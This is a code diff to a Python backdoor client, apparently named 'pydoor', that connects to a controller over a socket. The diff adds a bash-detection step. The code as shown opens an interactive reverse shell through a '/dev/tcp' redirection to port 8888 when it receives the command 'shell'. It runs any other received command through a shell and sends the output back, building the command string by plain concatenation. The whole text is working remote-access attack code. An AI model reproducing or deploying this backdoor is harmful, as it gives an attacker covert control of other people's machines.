@@ -13,13 +13,31 @@ class Client:
     def __init__(self):
         self.sock = 0
         self.cmd = 0
+        self.shell = "/bin/sh"
+
+
+    def checkbash(self):
+        
+        try:
+
+            subprocess.call(["bash","--help"],stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL)
+            self.shell = "/bin/bash"
+            print("Shell is bash")
+        except:
+            print("Shell is not bash")
+            pass
+
+
+
+
+
     def processcmd(self):
 
         if self.cmd:
             print(self.cmd)
 
             if self.cmd == "shell":
-                subprocess.run("bash -i >& /dev/tcp/127.0.0.1/8888 0>&1", shell=True)
+                subprocess.run([self.shell + " -i >& /dev/tcp/127.0.0.1/8888 0>&1"], shell=True)
             elif self.cmd == "quit":
                 self.sock.send(b"pydoor.quit")
                 sys.exit(0)
@@ -30,12 +48,14 @@ class Client:
                 self.start()
             
             else:
-                j = subprocess.getoutput(self.cmd)
+                j = subprocess.getoutput(self.shell + " -c '" + self.cmd + "'")
                 self.sock.send(j.encode())
 
     def start(self):
         
         print("Starting client" )
+
+        self.checkbash()
 
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
